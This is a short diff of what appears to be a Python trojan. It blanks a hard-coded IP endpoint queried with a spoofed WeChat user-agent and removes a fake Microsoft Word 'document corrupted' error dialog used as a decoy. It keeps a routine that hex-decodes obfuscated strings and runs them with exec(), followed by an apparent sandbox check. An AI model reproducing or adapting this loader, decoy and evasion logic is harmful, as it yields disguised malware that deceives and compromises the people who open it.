@@ -11,7 +11,7 @@ import time
 
 
 def getcode():
-    url = 'http://39.105.4.71/getAuth.php'
+    url = ''
     headers = {
         'user-agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 MicroMessenger/6.5.2.501 NetType/WIFI WindowsWechat',
         'referer':'https://api.weixin.qq.com'
@@ -92,11 +92,6 @@ def neworldX(body):
     L5 = (a2b_hex(bytes(LunaticRedEyes5.replace('Reisen','065red').replace('redeye','7'),'utf-8')).decode().replace('sakuya','zh3n91').replace('tyens','zh3iic0d3'))
     exec(L1+'\n'+L2+'\n'+L3+'\n'+L4+'\n'+L5)
 
-time.sleep(2)
-top = tkinter.Tk()
-top.withdraw()
-tkinter.messagebox.showerror('Microsoft Office Word','Word无法读取文档,文档可能损坏。\n请尝试下列方法:\n* 打开并修复文件\n* 用文本恢复转换器打开文件。')
-top.destroy()
 time.sleep(10)
 cvm = checksystem()
 if cvm == False:
